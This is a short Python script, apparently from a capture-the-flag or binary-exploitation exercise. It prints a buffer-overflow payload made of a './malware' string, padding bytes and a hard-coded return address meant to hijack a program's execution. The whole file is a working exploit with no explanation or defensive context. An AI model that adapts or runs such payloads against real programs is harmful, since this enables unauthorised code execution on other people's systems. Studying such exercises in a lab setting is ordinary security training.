import sys
payload = b"./malware\x00" + b"A" * 14 + b"\x6b\x1a\x40\x00\x00\x00\x00\x00"
sys.stdout.buffer.write(payload)
